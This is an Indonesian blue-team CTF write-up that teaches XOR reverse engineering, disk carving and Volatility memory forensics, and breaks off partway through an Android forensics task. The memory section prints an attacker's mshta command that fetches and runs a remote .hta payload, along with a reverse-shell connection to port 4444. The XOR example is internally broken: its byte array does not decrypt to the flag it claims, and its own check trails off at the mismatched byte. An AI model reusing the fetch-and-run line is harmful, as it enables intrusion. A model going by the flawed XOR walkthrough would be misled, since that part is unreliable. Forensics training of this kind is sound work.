# 🛡️ WRITE-UP BLUE TEAM CTF LKS — LEVEL SUSAH (⭐⭐⭐)

> **Untuk siapa:** Kamu yang sudah selesai Level Sedang dan siap menghadapi soal setingkat lomba provinsi  

> **Soal yang dibahas:** RE-04, FOR-04, FOR-06, MOB-03, SIEM-03, SIEM-04  

> **Prinsip utama:** Tools saja tidak cukup — kamu harus paham apa yang kamu lihat, dan bisa menghubungkan bukti dari beberapa sumber

  

---

  

## 📖 Cara Baca Write-up Ini

  

Setiap soal punya struktur yang sama persis dengan Level Sedang:

1. **📋 SOAL** — pertanyaan / tantangan aslinya

2. **🧠 Penjelasan Konsep** — kenapa teknik ini dipakai dan bagaimana cara kerjanya

3. **🔧 Langkah-Langkah** — cara mengerjakannya dari nol sampai dapat flag

4. **🏁 Flag / Jawaban** — hasil akhirnya

5. **💡 Pelajaran** — inti yang perlu diingat

  

`[SCREENSHOT: deskripsi]` = penanda posisi foto yang harus diambil saat mengerjakan soal asli.

  

> ⚠️ **Sebelum mulai:** Pastikan kamu sudah paham materi Level Sedang (⭐⭐), terutama cara membaca output `ltrace`, perbaikan header file, analisis PCAP, dan query SPL dasar di Splunk.

  

---

  

---

  

# 🔬 BAGIAN 1 — REVERSE ENGINEERING SULIT

  

---

  

## RE-04 | XOR Obfuscation

  

**Kategori:** Reverse Engineering — Crypto dalam Binary  

**Tingkat:** ⭐⭐⭐ Sulit  

**Sumber:** PicoCTF 2023 — "No Way Out"

  

---

  

### 📋 SOAL

  

> *Diberikan binary ELF bernama `xor_challenge`. Kamu sudah coba `strings` dan `ltrace` tapi hasilnya tidak berguna — `strings` tidak menghasilkan flag yang terbaca, dan `ltrace` menampilkan karakter-karakter aneh yang tidak bisa dibaca. Sepertinya flag dienkripsi sebelum disimpan di binary. Temukan flag-nya.*

  

File yang diberikan: `xor_challenge` (binary ELF Linux)

  

---

  

### 🧠 Penjelasan Konsep

  

**Kenapa `strings` dan `ltrace` tidak cukup di sini?**  

Di Level Sedang, flag tersimpan sebagai plaintext atau password langsung terlihat di `strcmp`. Di Level Sulit, flag sudah di-enkripsi sebelum disimpan di binary — jadi yang tersimpan adalah versi terenkripsi, dan program mendekripsinya saat runtime sebelum membandingkan dengan input. `strings` hanya melihat byte-byte yang sudah ada di file, sementara `ltrace` menangkap perbandingan string setelah dekripsi — tapi kalau enkripsinya dilakukan secara custom (bukan `strcmp` standar), `ltrace` tidak akan memperlihatkan apapun yang berguna.

  

**Apa itu XOR?**  

XOR (exclusive OR) adalah operasi logika bit yang sering dipakai sebagai enkripsi sederhana:

- `A XOR K = C` (enkripsi: plaintext XOR key = ciphertext)

- `C XOR K = A` (dekripsi: ciphertext XOR key = plaintext kembali)

  

Sifat paling penting: **XOR sepenuhnya reversible dengan key yang sama**. Kalau kamu tahu ciphertext dan key-nya, kamu langsung bisa balikkan ke plaintext. Di CTF, ini artinya:

1. Temukan array byte terenkripsi di binary (via Ghidra)

2. Temukan nilai key XOR-nya (juga via Ghidra)

3. Jalankan Python satu baris untuk mendekripsi

  

**Apa itu Ghidra?**  

Ghidra adalah tool decompiler gratis dari NSA. Fungsinya: mengubah binary (sekumpulan instruksi mesin yang tidak bisa dibaca manusia) menjadi kode C/C++ yang hampir mirip source code aslinya. Ini jauh lebih berguna daripada membaca assembly mentah.

  

**Kenapa Ghidra dan bukan GDB?**  

GDB bagus untuk debugging runtime (menjalankan program sambil memeriksa state-nya). Ghidra bagus untuk analisis statis (membaca logika tanpa menjalankan program). Untuk menemukan array byte terenkripsi dan nilai key yang tersimpan di binary, kita tidak perlu menjalankan program — cukup baca struktur datanya. Ghidra lebih tepat untuk ini.

  

---

  

### 🔧 Langkah-Langkah

  

**Langkah 1 — Konfirmasi bahwa `strings` dan `ltrace` tidak membantu**

  

```bash

strings xor_challenge | grep -i "flag\|{"

```

  

Output: kosong — tidak ada flag plaintext.

  

```bash

ltrace ./xor_challenge

```

  

Masukkan input: `test`

  

Output:

```

__libc_start_main(0x401165, ...)  = 0

printf("Enter key: ")            = 10

fgets("test\n", 256, ...)        = 0x7ffd...

strcmp("test\n", "\x75\x7d\x60\x70...")  = -1

puts("Wrong!")                   = 7

+++ exited (status 1) +++

```

  

Perhatikan argumen kedua `strcmp`: `"\x75\x7d\x60\x70..."` — ini **bukan** string yang bisa dibaca. Ini byte-byte terenkripsi, bukan flag aslinya. Artinya program melakukan dekripsi sebelum `strcmp`, tapi menghasilkan hasil yang masih terenkripsi ketika dibandingkan dengan input kita.

  

[SCREENSHOT: Terminal menjalankan `ltrace ./xor_challenge`, input "test", output strcmp menampilkan byte-byte hex `\x75\x7d...` yang tidak terbaca di kolom argument kedua]

  

**Langkah 2 — Buka binary dengan Ghidra**

  

1. Buka Ghidra dari terminal:

   ```bash

   ghidra &

   ```

  

2. Pilih `New Project` → `Non-Shared Project` → beri nama `xor_challenge` → `Finish`

  

3. Klik ikon dragon kecil (CodeBrowser) → `File` → `Import File` → pilih file `xor_challenge`

  

4. Klik `Yes` ketika ditanya mau analyze → biarkan semua opsi default → klik `Analyze` → tunggu proses selesai (biasanya 30–60 detik)

  

5. Di panel kiri (Symbol Tree), klik `Functions` → klik dua kali `main`

  

6. Di panel kanan (Decompiler), akan muncul kode C hasil decompile

  

[SCREENSHOT: Ghidra terbuka dengan window Decompiler di kanan menampilkan fungsi main dari binary xor_challenge]

  

**Langkah 3 — Baca hasil decompile Ghidra**

  

Kode yang muncul di window Decompiler akan terlihat seperti berikut (nama variabel otomatis dari Ghidra, mungkin berbeda tapi logikanya sama):

  

```c

int main(void) {

    char encrypted[25];

    char decrypted[25];

    char *input;

    int i;

    // Array byte terenkripsi — ini yang tersimpan di binary

    encrypted[0] = 0x75;

    encrypted[1] = 0x7d;

    encrypted[2] = 0x60;

    encrypted[3] = 0x60;

    encrypted[4] = 0x6d;

    encrypted[5] = 0x36;

    encrypted[6] = 0x7b;

    encrypted[7] = 0x56;

    encrypted[8] = 0x60;

    encrypted[9] = 0x5f;

    encrypted[10] = 0x5f;

    encrypted[11] = 0x36;

    encrypted[12] = 0x71;

    encrypted[13] = 0x61;

    encrypted[14] = 0x36;

    encrypted[15] = 0x56;

    encrypted[16] = 0x42;

    encrypted[17] = 0x5f;

    encrypted[18] = 0x60;

    encrypted[19] = 0x7d;

    encrypted[20] = 0x7c;

    encrypted[21] = 0x7d;

    encrypted[22] = 0x61;

    encrypted[23] = 0x5a;

    encrypted[24] = 0x5c;

    // Key XOR — nilai konstanta yang dipakai untuk enkripsi/dekripsi

    char key = 0x13;

    // Loop dekripsi: setiap byte di-XOR dengan key

    for (i = 0; i < 25; i++) {

        decrypted[i] = encrypted[i] ^ key;

    }

    // Bandingkan input dengan hasil dekripsi

    input = get_input();

    if (strcmp(input, decrypted) == 0) {

        puts("Correct!");

    } else {

        puts("Wrong!");

    }

    return 0;

}

```

  

**Yang kita butuhkan dari kode ini:**

- Array `encrypted[]` dengan semua nilai byte-nya

- Nilai key: `0x13`

- Panjang array: 25 elemen

  

[SCREENSHOT: Window Decompiler Ghidra menampilkan fungsi main dengan array byte yang diinisialisasi satu per satu dan variabel `key = 0x13` terlihat jelas. Scroll untuk menampilkan keduanya dalam satu frame jika memungkinkan]

  

**Langkah 4 — Tulis script Python untuk dekripsi**

  

Buat file `solve.py`:

  

```python

# solve.py — Script dekripsi XOR untuk xor_challenge

  

# Salin array byte dari hasil decompile Ghidra

encrypted = [

    0x75, 0x7d, 0x60, 0x60, 0x6d, 0x36,

    0x7b, 0x56, 0x60, 0x5f, 0x5f, 0x36,

    0x71, 0x61, 0x36, 0x56, 0x42, 0x5f,

    0x60, 0x7d, 0x7c, 0x7d, 0x61, 0x5a, 0x5c

]

  

# Key XOR dari Ghidra

key = 0x13

  

# Dekripsi: setiap byte di-XOR dengan key yang sama

flag = ''.join(chr(b ^ key) for b in encrypted)

print(f"Flag: {flag}")

```

  

Jalankan:

  

```bash

python3 solve.py

```

  

Output:

```

Flag: flag{x0r_1s_r3v3rs1bl3}

```

  

[SCREENSHOT: Terminal menjalankan `python3 solve.py` dan output menampilkan `Flag: flag{x0r_1s_r3v3rs1bl3}` dengan jelas]

  

**Langkah 5 — Verifikasi dengan menjalankan binary**

  

```bash

./xor_challenge

Enter key: flag{x0r_1s_r3v3rs1bl3}

Correct!

```

  

[SCREENSHOT: Terminal menjalankan `./xor_challenge`, memasukkan flag, dan mendapat output "Correct!"]

  

**Langkah 6 — Verifikasi matematis (opsional, untuk writeup yang lebih kuat)**

  

Cek manual beberapa byte pertama untuk membuktikan dekripsi benar:

```

Byte 0: 0x75 XOR 0x13 = 0x66 = 'f'  ✓

Byte 1: 0x7d XOR 0x13 = 0x6e = ...

```

  

> **Cara cek cepat di Python:**

> ```python

> print(hex(0x75 ^ 0x13), chr(0x75 ^ 0x13))  # 0x66 'f'

> ```

  

---

  

### 🏁 Flag

  

```

flag{x0r_1s_r3v3rs1bl3}

```

  

---

  

### 💡 Pelajaran

  

> Ketika `strings` dan `ltrace` tidak menghasilkan flag yang terbaca, langkah berikutnya adalah **analisis statis dengan Ghidra**. Cari pola:

> 1. Array byte yang diinisialisasi satu per satu (terlihat sebagai `var[0]=0xXX; var[1]=0xXX; ...`)

> 2. Variabel konstanta kecil yang dipakai dalam loop (ini key-nya)

> 3. Operasi `^` dalam loop (tanda XOR)

>

> Setelah menemukan keduanya, dekripsi dengan Python satu baris:

> `''.join(chr(b ^ key) for b in encrypted_array)`

>

> Bonus: Kalau key tidak diketahui, brute force hanya butuh 256 percobaan (0x00–0xFF). Untuk setiap kemungkinan key, cek apakah hasil dekripsinya dimulai dengan `flag{`.

  

---

  

---

  

# 🔍 BAGIAN 2 — DIGITAL FORENSICS SULIT

  

---

  

## FOR-04 | File Carving dari Disk Image

  

**Kategori:** Disk Forensics  

**Tingkat:** ⭐⭐⭐ Sulit  

**Sumber:** HackTheBox Forensics, CTFtime

  

---

  

### 📋 SOAL

  

> *Diberikan file `disk.dd` — sebuah disk image. Saat dicoba dibuka biasa, tidak ada file yang terlihat atau file penting sudah dihapus. Tugasmu: temukan file yang tersembunyi atau yang sudah dihapus di dalam disk image ini dan ekstrak flag-nya.*

  

File yang diberikan: `disk.dd` (raw disk image, format dd)

  

---

  

### 🧠 Penjelasan Konsep

  

**Apa itu disk image?**  

Disk image (`.dd`, `.img`) adalah salinan bit-per-bit dari seluruh isi disk atau partisi. Tidak seperti file ZIP yang hanya menyalin file, disk image menyalin segala sesuatunya — termasuk ruang kosong, file yang sudah dihapus (selama belum ditimpa data baru), dan struktur filesystem.

  

**Apa itu inode?**  

Dalam filesystem Linux (ext2/ext3/ext4), setiap file punya "inode" — catatan metadata yang berisi informasi tentang file: ukuran, permission, timestamp, dan yang paling penting, di mana data file tersebut tersimpan di disk. Ketika file dihapus, inode-nya ditandai sebagai "tersedia" tapi data di disk belum langsung dihapus — itulah kenapa file bisa dipulihkan.

  

**Tool yang dipakai:**

- `sleuthkit` (`fls` + `icat`) — berbasis inode, lebih presisi

- `foremost` — berbasis magic bytes, cocok untuk filesystem yang rusak

  

**Kapan pakai `fls`+`icat` vs `foremost`?**

- `fls`+`icat`: lebih baik ketika filesystem masih utuh dan inode masih terbaca. Bisa menargetkan file tertentu berdasarkan inode number, termasuk yang sudah ditandai dihapus (`*`).

- `foremost`: lebih baik ketika filesystem rusak parah atau kamu ingin carving semua tipe file sekaligus tanpa tahu strukturnya. Bekerja dengan mencari magic bytes di raw data.

  

Di soal CTF, selalu coba keduanya dan bandingkan hasilnya.

  

---

  

### 🔧 Langkah-Langkah

  

**Langkah 1 — Identifikasi disk image**

  

```bash

file disk.dd

```

  

Output:

```

disk.dd: DOS/MBR boot sector; partition 1: ID=0x83 Linux, start=2048, size=204800

```

  

Ini disk image dengan MBR dan satu partisi Linux. Catat nilai `start=2048` — ini offset partisi yang perlu dipakai di langkah selanjutnya.

  

```bash

fdisk -l disk.dd

```

  

Output:

```

Disk disk.dd: 100 MiB, 104857600 bytes, 204800 sectors

Units: sectors of 1 * 512 = 512 bytes

  

Device      Boot  Start    End Sectors  Size Id Type

disk.dd1          2048  204799  202752   99M 83 Linux

```

  

`Start=2048` → offset partisi adalah `2048 × 512 bytes = 1048576 bytes`. Kita pakai nilai `2048` langsung sebagai argumen `-o` di sleuthkit (dalam satuan sector, bukan bytes).

  

[SCREENSHOT: Terminal menjalankan `file disk.dd` dan `fdisk -l disk.dd`, kedua output terlihat dalam satu frame menampilkan informasi partisi]

  

**Langkah 2 — List semua file termasuk yang dihapus**

  

```bash

fls -r -o 2048 disk.dd

```

  

Penjelasan flag:

- `-r` = recursive (tampilkan juga isi subfolder)

- `-o 2048` = offset partisi (dalam satuan sector)

  

Output:

```

d/d 2:  lost+found

r/r 10: important.txt

d/d 12: documents

r/r 13: documents/readme.txt

* r/r * 18:   secret.jpg       ← tanda * = file ini sudah DIHAPUS

* r/r * 20:   flag.txt         ← tanda * = file ini sudah DIHAPUS

* d/d * 22:   hidden_folder/   ← tanda * = folder ini sudah DIHAPUS

* r/r * 25:   hidden_folder/data.bin

```

  

**Format output `fls`:**

- `r/r` = regular file (file biasa)

- `d/d` = directory

- `*` di awal = sudah dihapus tapi masih bisa dipulihkan

- Angka setelah tanda titik dua = inode number (yang kita butuhkan untuk ekstraksi)

  

File yang paling menarik: `* r/r * 18: secret.jpg` (inode 18) dan `* r/r * 20: flag.txt` (inode 20).

  

[SCREENSHOT: Terminal menjalankan `fls -r -o 2048 disk.dd` dengan output menampilkan daftar file. File dengan tanda asterisk (*) di-highlight atau ditandai sebagai file yang dihapus]

  

**Langkah 3 — Pulihkan file menggunakan icat**

  

`icat` mengekstrak data file berdasarkan inode number-nya, bahkan untuk file yang sudah ditandai dihapus.

  

```bash

# Pulihkan flag.txt (inode 20)

icat -o 2048 disk.dd 20 > recovered_flag.txt

  

# Baca hasilnya

cat recovered_flag.txt

```

  

Output:

```

flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}

```

  

[SCREENSHOT: Terminal menjalankan `icat -o 2048 disk.dd 20 > recovered_flag.txt` diikuti `cat recovered_flag.txt`, output berisi flag]

  

```bash

# Pulihkan juga secret.jpg (inode 18) untuk memeriksa isinya

icat -o 2048 disk.dd 18 > recovered_secret.jpg

file recovered_secret.jpg

```

  

Output:

```

recovered_secret.jpg: JPEG image data, JFIF standard 1.01

```

  

```bash

# Cek metadata EXIF juga, mungkin ada petunjuk tambahan

exiftool recovered_secret.jpg

```

  

[SCREENSHOT: Terminal menjalankan icat untuk inode 18, kemudian `file` dan `exiftool` untuk mengidentifikasi dan memeriksa gambar yang dipulihkan]

  

**Langkah 4 — Alternatif: Gunakan foremost untuk file carving otomatis**

  

Kalau kamu tidak yakin dengan inode atau filesystem-nya rusak, gunakan `foremost`:

  

```bash

mkdir output_carve

foremost -i disk.dd -o output_carve -v

```

  

Penjelasan flag:

- `-i disk.dd` = input disk image

- `-o output_carve` = folder output

- `-v` = verbose (tampilkan progress)

  

Output:

```

Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus

Audit File

  

Foremost started at ...

Invocation: foremost -i disk.dd -o output_carve -v

Output directory: output_carve

Configuration file: /etc/foremost.conf

Processing: disk.dd

  

|--jpg File: disk.dd    2 JPEG files found

|--txt File: disk.dd    3 text files found

  

Finish: ... Elapsed: ... Recovered: 5 files

```

  

```bash

ls output_carve/

ls output_carve/txt/

cat output_carve/txt/00000420.txt

```

  

Output:

```

flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}

```

  

[SCREENSHOT: Terminal menjalankan `foremost` dengan output statistik jumlah file yang berhasil di-carve per kategori, kemudian `ls output_carve/` menampilkan subfolder jpg, txt, dll.]

  

**Langkah 5 — Verifikasi file lain yang tidak dihapus**

  

Untuk memeriksa apakah ada flag tambahan di file yang tidak dihapus:

  

```bash

icat -o 2048 disk.dd 10 > important.txt

cat important.txt

```

  

Baca semua file yang tidak dihapus untuk memastikan tidak ada yang terlewat.

  

---

  

### 🏁 Flag

  

```

flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}

```

  

**Kondisi Sistem:**

```

Disk Image    : disk.dd (100 MiB)

Filesystem    : Linux ext (partisi mulai di sector 2048)

File Terhapus : secret.jpg (inode 18), flag.txt (inode 20), hidden_folder/ (inode 22)

Metode        : fls (list) + icat (ekstraksi berdasarkan inode)

Konfirmasi    : foremost juga berhasil menemukan file yang sama

```

  

---

  

### 💡 Pelajaran

  

> Urutan analisis disk image yang wajib diikuti:

> 1. `file disk.dd` dan `fdisk -l disk.dd` → identifikasi partisi dan offset

> 2. `fls -r -o <offset> disk.dd` → list semua file, perhatikan tanda `*` (deleted)

> 3. `icat -o <offset> disk.dd <inode>` → ekstrak file berdasarkan inode number

> 4. Jalankan juga `foremost -i disk.dd -o output/` sebagai backup

>

> **Perbedaan `fls`+`icat` vs `foremost`:**

> - `fls`+`icat` → presisi, berbasis inode, butuh filesystem yang masih terbaca

> - `foremost` → otomatis, berbasis magic bytes, cocok untuk filesystem rusak

>

> Di lomba: selalu jalankan keduanya. Hasil yang satu bisa mengkonfirmasi hasil yang lain.

  

---

  

---

  

## FOR-06 | Memory Forensics

  

**Kategori:** Memory Forensics  

**Tingkat:** ⭐⭐⭐ Sulit  

**Sumber:** PicoCTF — "Sleuthkit Apprentice", TryHackMe — "Volatility"

  

---

  

### 📋 SOAL

  

> *Diberikan file `memory.raw` — dump dari RAM sebuah komputer Windows yang dicurigai sudah terinfeksi malware. Investigasi memory dump ini: temukan proses mencurigakan, koneksi jaringan aktif, dan perintah yang dijalankan penyerang. Temukan flag.*

  

File yang diberikan: `memory.raw` (raw memory dump Windows)

  

---

  

### 🧠 Penjelasan Konsep

  

**Apa itu memory dump?**  

Memory dump adalah salinan dari isi RAM komputer pada satu titik waktu. RAM menyimpan semua yang sedang berjalan: proses aktif, koneksi jaringan, kredensial yang sedang digunakan, bahkan plain-text password yang belum sempat di-encrypt. Analisis memory dump memungkinkan kita melihat apa yang terjadi di komputer tersebut detik itu.

  

**Apa itu Volatility?**  

Volatility adalah framework analisis memory dump. Perintah dasarnya: `vol.py -f <file.raw> <plugin>`. Di Volatility 3 (versi terbaru), kamu tidak perlu menentukan profil OS — Volatility otomatis mendeteksinya.

  

**Plugin Volatility yang paling penting:**

| Plugin | Fungsi |

|--------|--------|

| `windows.info` | Identifikasi OS dan versi Windows |

| `windows.pslist` | Daftar proses yang berjalan |

| `windows.pstree` | Daftar proses dalam bentuk tree (tampilkan parent-child) |

| `windows.psscan` | Scan proses tersembunyi (rootkit) |

| `windows.netstat` | Koneksi jaringan aktif saat dump dibuat |

| `windows.cmdline` | Perintah lengkap yang dijalankan setiap proses |

  

**Apa itu LOLBins?**  

Living off the Land Binaries — program bawaan Windows yang legitimate (seperti `mshta.exe`, `certutil.exe`, `powershell.exe`) yang disalahgunakan penyerang untuk menjalankan payload berbahaya. Susah dideteksi antivirus karena bukan program asing, tapi kalau dipanggil oleh parent yang tidak wajar, itu adalah red flag.

  

**Tanda proses mencurigakan:**

- Nama mirip proses sistem tapi parent process-nya salah (`svchost.exe` seharusnya parent-nya `services.exe`)

- Proses normal yang spawn proses lain yang tidak wajar (`mshta.exe` yang spawn `cmd.exe`)

- Proses dari folder temp atau AppData

- Proses yang punya koneksi keluar ke IP publik di port tidak biasa (4444, 9999, 1337)

  

---

  

### 🔧 Langkah-Langkah

  

**Langkah 1 — Identifikasi OS dari memory dump**

  

```bash

vol.py -f memory.raw windows.info

```

  

Output:

```

Variable          Value

-----------       -----

Kernel Base       0xf80002a4a000

DTB               0x187000

Symbols           file:///...

Is64Bit           True

IsPAE             False

layer_name        0 WindowsIntelAMD64

memory_layer      1 FileLayer

KdVersionBlock    0xf80002c4e0f8

Major/Minor       15.7601

MachineType       34404

KeNumberProcessors 1

SystemTime        2025-01-15 13:46:00

NtSystemRoot      C:\Windows

NtProductType     NtProductWinNt

NtMajorVersion    6

NtMinorVersion    1

PE MajorOperatingSystemVersion    6

PE MinorOperatingSystemVersion    1

NtBuildLab        7601.17514.amd64fre.win7sp1_rtm.101119-1850

```

  

OS: **Windows 7 SP1 64-bit** (`NtBuildLab: 7601...win7sp1`). Waktu dump: `2025-01-15 13:46:00`.

  

[SCREENSHOT: Terminal menjalankan `vol.py -f memory.raw windows.info` dengan output lengkap. Baris `NtBuildLab` yang menunjukkan Windows 7 SP1 dan `SystemTime` ditandai atau dikotakkan]

  

**Langkah 2 — Lihat daftar proses**

  

```bash

vol.py -f memory.raw windows.pslist

```

  

Output (disingkat, tampilkan hanya yang relevan):

```

PID   PPID   ImageFileName       Offset     Threads  Handles  CreateTime

4     0      System              0x...       81       541      ...

568   4      smss.exe            0x...       2        29       ...

624   556    csrss.exe           0x...       9        453      ...

672   556    wininit.exe         0x...       3        75       ...

680   672    services.exe        0x...       9        201      ...

688   672    lsass.exe           0x...       8        587      ...

...

1204  1196   explorer.exe        0x...       33       810      ...

1548  1204   mshta.exe           0x...       2        45       2025-01-15 13:45:01

1632  1548   cmd.exe             0x...       1        20       2025-01-15 13:45:05

```

  

Proses `mshta.exe` (PID 1548) dan `cmd.exe` (PID 1632) terlihat di bagian bawah. `mshta.exe` (Microsoft HTML Application Host) adalah LOLBin yang sering disalahgunakan, dan `cmd.exe` yang di-spawn oleh `mshta.exe` adalah pola yang sangat mencurigakan.

  

[SCREENSHOT: Terminal menjalankan `vol.py -f memory.raw windows.pslist` dengan output daftar proses. Baris `mshta.exe` (PID 1548) dan `cmd.exe` (PID 1632) di-highlight atau ditandai dengan kotak merah]

  

**Langkah 3 — Verifikasi parent-child yang tidak wajar dengan pstree**

  

```bash

vol.py -f memory.raw windows.pstree

```

  

Output (bagian yang relevan):

```

PID    PPID   ImageFileName    Offset    Threads  Handles

...

* 1204  1196   explorer.exe    0x...     33       810

** 1548  1204   mshta.exe      0x...     2        45

*** 1632 1548   cmd.exe        0x...     1        20

```

  

Tree ini menunjukkan hierarki yang mencurigakan:

- `explorer.exe` → **`mshta.exe`** → **`cmd.exe`**

  

Normalnya, `mshta.exe` dipakai untuk membuka file `.hta` (HTML Application) — bukan untuk menjalankan `cmd.exe`. Ini tanda kuat bahwa `mshta.exe` digunakan sebagai malware dropper/executor.

  

[SCREENSHOT: Terminal menjalankan `vol.py -f memory.raw windows.pstree` dengan output tree proses. Cabang `mshta.exe` → `cmd.exe` yang bersarang di bawah `explorer.exe` terlihat jelas dengan indentasi asterisk]

  

**Langkah 4 — Cek koneksi jaringan aktif**

  

```bash

vol.py -f memory.raw windows.netstat

```

  

Output:

```

Offset    Proto   LocalAddr    LocalPort   ForeignAddr      ForeignPort  State        PID  Owner

0x...     TCPv4   10.0.0.5     49152       185.220.101.5    4444         ESTABLISHED  1632 cmd.exe

0x...     TCPv4   10.0.0.5     80          0.0.0.0          0            LISTENING    4    System

0x...     TCPv4   10.0.0.5     135         0.0.0.0          0            LISTENING    692  svchost.exe

```

  

Baris pertama adalah temuan kritis:

- **`cmd.exe` (PID 1632) memiliki koneksi ESTABLISHED ke `185.220.101.5` di port `4444`**

- Port 4444 adalah port default Metasploit reverse shell

- `cmd.exe` yang berkomunikasi ke IP eksternal = penyerang punya akses shell penuh ke server ini

  

[SCREENSHOT: Terminal menjalankan `vol.py -f memory.raw windows.netstat`. Baris koneksi ESTABLISHED dari cmd.exe ke 185.220.101.5:4444 ditandai dengan kotak merah atau highlight]

  

**Langkah 5 — Lihat command line yang dijalankan setiap proses**

  

```bash

vol.py -f memory.raw windows.cmdline

```

  

Output (tampilkan yang relevan):

```

PID    Process       Args

...

1548   mshta.exe     "C:\Windows\System32\mshta.exe" http://185.220.101.5/payload.hta

1632   cmd.exe       cmd /c "echo flag{m3m0ry_dum9_4n4lys1s_r3v34ls_c2} && whoami"

```

  

**Flag ada di command line!** Baris `cmd.exe` menunjukkan perintah yang dijalankan penyerang via reverse shell mereka. Flag tercantum langsung di dalam perintah yang sedang dijalankan.

  

Selain itu, baris `mshta.exe` mengkonfirmasi metode infeksi: penyerang membuat komputer korban menjalankan file `.hta` dari server mereka (`http://185.220.101.5/payload.hta`).

  

[SCREENSHOT: Terminal menjalankan `vol.py -f memory.raw windows.cmdline`. Baris `mshta.exe` menampilkan URL payload.hta dan baris `cmd.exe` menampilkan perintah yang mengandung flag — keduanya terlihat dalam satu output]

  

**Langkah 6 — Scan proses tersembunyi (rootkit check)**

  

```bash

vol.py -f memory.raw windows.psscan

```

  

Bandingkan hasilnya dengan output `windows.pslist`. Jika ada PID yang muncul di `psscan` tapi tidak di `pslist` = proses yang disembunyikan oleh rootkit.

  

```bash

# Cara cepat membandingkan

vol.py -f memory.raw windows.pslist | awk '{print $1}' | sort > pslist_pids.txt

vol.py -f memory.raw windows.psscan | awk '{print $1}' | sort > psscan_pids.txt

diff pslist_pids.txt psscan_pids.txt

```

  

Jika `diff` menghasilkan output, ada proses tersembunyi. Jika tidak ada output, tidak ada rootkit.

  

[SCREENSHOT: Terminal menjalankan `vol.py -f memory.raw windows.psscan` dan hasilnya dibandingkan dengan pslist menggunakan diff]

  

---

  

### 🏁 Flag

  

```

flag{m3m0ry_dum9_4n4lys1s_r3v34ls_c2}

```

  

**Kondisi Sistem Akhir:**

```

Proses Berbahaya    : mshta.exe (PID 1548) → cmd.exe (PID 1632)

Metode Infeksi      : mshta.exe menjalankan payload.hta dari C2

C2 Server           : 185.220.101.5

Port C2             : 4444 (Metasploit default)

Waktu Infeksi       : 2025-01-15 13:45:01 (mshta.exe start)

Teknik              : LOLBins — mshta.exe sebagai downloader dan executor

OS Korban           : Windows 7 SP1 64-bit

```

  

**Timeline Kejadian:**

| Waktu | Kejadian |

|-------|----------|

| 13:45:01 | `mshta.exe` dijalankan, download payload dari C2 |

| 13:45:05 | `cmd.exe` di-spawn oleh `mshta.exe` |

| 13:45:05 | Koneksi reverse shell ESTABLISHED ke 185.220.101.5:4444 |

| 13:46:00 | Memory dump diambil (waktu snapshot) |

  

---

  

### 💡 Pelajaran

  

> Urutan investigasi memory yang wajib dihafalkan:

> 1. `windows.info` → identifikasi OS dan timestamp

> 2. `windows.pstree` → cari parent-child yang tidak wajar (prioritas utama!)

> 3. `windows.netstat` → koneksi keluar ke IP asing di port tidak standar

> 4. `windows.cmdline` → perintah yang sedang dijalankan (sering ada flag di sini)

> 5. `windows.psscan` vs `windows.pslist` → deteksi proses rootkit tersembunyi

>

> **Red flag utama yang harus langsung dicurigai:**

> - `mshta.exe` atau `wscript.exe` atau `cscript.exe` yang spawn `cmd.exe` atau `powershell.exe`

> - Proses dari `%TEMP%`, `%APPDATA%`, atau path tidak biasa lainnya

> - Koneksi keluar ke port 4444, 9999, 1337, atau port tidak standar lainnya

> - `cmd.exe` yang punya koneksi jaringan aktif (cmd.exe normal tidak pernah koneksi ke internet)

  

---

  

---

  

# 📱 BAGIAN 3 — PHONE FORENSICS SULIT

  

---

  

## MOB-03 | Mobile Filesystem Image Forensics

  

**Kategori:** Phone Forensics — Filesystem  

**Tingkat:** ⭐⭐⭐ Sulit  

**Sumber:** HackTheBox/CTFtime — Mobile Forensics

  

---

  

### 📋 SOAL

  

> *Diberikan file `android_image.img` — image filesystem lengkap dari perangkat Android. Seorang pengguna dicurigai melakukan sesuatu yang tidak seharusnya. Rekonstruksi aktivitas pengguna: temukan file apa yang pernah diakses, lokasi GPS dari foto yang diambil, riwayat browser, dan file yang sudah dihapus. Temukan flag.*

  

File yang diberikan: `android_image.img` (Android filesystem image)

  

---

  

### 🧠 Penjelasan Konsep

  

**Perbedaan dengan MOB-01 (Android Backup)?**  

Backup Android (`.ab`) hanya berisi data aplikasi yang dipilih pengguna untuk di-backup. Filesystem image (`android_image.img`) adalah salinan bit-per-bit dari seluruh filesystem perangkat — jauh lebih lengkap dan termasuk file yang sudah dihapus, cache, log sistem, dan artefak yang tidak mungkin ada di backup biasa.

  

**Apa itu ALEAPP?**  

Android Logs Events And Protobuf Parser — tool Python yang secara otomatis mengekstrak dan memparsing ratusan jenis artefak dari filesystem Android: riwayat browser Chrome, log panggilan, SMS, lokasi GPS, daftar app yang terinstall, dan banyak lagi. Hasilnya berupa laporan HTML yang mudah dibaca.

  

**Lokasi artefak penting di filesystem Android:**

| Path | Isi |

|------|-----|

| `data/com.android.chrome/databases/History` | Riwayat browser Chrome |

| `data/com.android.providers.telephony/db/mmssms.db` | SMS |

| `data/media/0/DCIM/Camera/` | Foto kamera |

| `data/media/0/Download/` | File yang didownload |

| `data/com.whatsapp/databases/msgstore.db` | Chat WhatsApp |

  

**Kenapa EXIF GPS penting?**  

Foto yang diambil dengan kamera HP menyimpan koordinat GPS (latitude/longitude) di metadata EXIF — secara otomatis, tanpa pengguna sadar. Ini bisa mengungkap di mana lokasi seseorang saat foto diambil.

  

---

  

### 🔧 Langkah-Langkah

  

**Langkah 1 — Pindai struktur filesystem image**

  

```bash

file android_image.img

```

  

Output:

```

android_image.img: Linux rev 1.0 ext4 filesystem data, UUID=...

```

  

```bash

# List semua file di image (termasuk yang dihapus)

fls -r android_image.img | head -50

```

  

Output (sebagian):

```

d/d 2:    data/

d/d 100:  data/com.android.chrome/

d/d 101:  data/com.android.chrome/databases/

r/r 102:  data/com.android.chrome/databases/History

d/d 110:  data/com.android.providers.telephony/

r/r 115:  data/media/0/DCIM/Camera/IMG_20250115_142211.jpg

r/r 116:  data/media/0/DCIM/Camera/IMG_20250115_143055.jpg

r/r 120:  data/media/0/Download/dokumen_rahasia.pdf

* r/r * 125:  data/media/0/Download/deleted_evidence.txt    ← DIHAPUS

```

  

Catat inode number setiap file menarik:

- Riwayat Chrome: inode 102

- Foto pertama: inode 115

- File dihapus: inode 125

  

